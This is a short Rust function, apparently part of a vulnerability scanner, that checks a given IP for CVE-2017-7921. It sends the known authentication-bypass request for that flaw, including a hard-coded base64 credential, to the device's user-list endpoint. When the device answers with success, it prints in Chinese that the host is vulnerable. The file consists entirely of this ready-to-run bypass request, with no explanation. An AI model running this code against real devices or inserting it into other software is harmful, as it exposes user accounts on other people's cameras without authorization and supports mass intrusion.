use reqwest::Client;

// todo
pub async fn run(ip: &str, client: Client) {
    let req = client
        .get(format!("http://{ip}/Security/users?auth=YWRtaW46MTEK"))
        .send()
        .await;

    match req {
        Ok(resp) => {
            if resp.status().is_success() {
                println!("{ip} 存在 CVE-2017-7921 漏洞");
            }
        }
        Err(_) => {
            // no
        }
    }
}
